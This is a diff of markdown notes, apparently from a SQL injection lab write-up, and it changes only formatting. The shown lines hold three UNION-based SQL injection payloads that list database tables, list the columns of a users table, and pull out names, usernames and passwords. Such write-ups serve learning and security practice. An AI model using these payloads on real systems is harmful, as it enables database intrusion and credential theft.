@@ -37,15 +37,18 @@ User Id -> 1
 
 ```bash
  %' and 1=0 union select null, table_name from information_schema.tables # 
-``` [displaying all the tables]
+``` 
+[displaying all the tables]
 
 ### Interest Zone--Users Table-->
+
 ```bash
  %' and 1=0 union select null, concat(table_name,0x0a, column_name) from information_schema.columns where table_name = 'users' # 
 ```
 [0x0a for new line between table name and column name--hexadecimal code for sql]
 
 ### Extract the columns information
+
 ```bash 
 %' and 1=0 union select null, concat(first_name,0x0a, last_name,0x0a,user,0x0a,password,0x0a,avatar) from users # 
 ```
